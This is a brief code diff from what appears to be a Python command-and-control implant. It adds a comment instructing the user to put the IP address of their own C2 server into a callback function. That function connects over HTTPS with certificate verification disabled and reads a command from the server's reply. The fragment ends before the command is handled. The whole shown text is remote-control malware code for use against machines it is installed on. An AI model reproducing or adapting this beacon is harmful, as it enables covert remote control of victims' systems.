@@ -2,6 +2,7 @@ import os, ssl, time, http.client
 
 def callback():
     try:
+        # change 172.16.69.132 with IP of your c2 server
         c2_connection = http.client.HTTPSConnection('172.16.69.132', timeout=10, context=ssl._create_unverified_context())
         c2_connection.request("GET", "/")
         cmd = c2_connection.getresponse().read().decode()
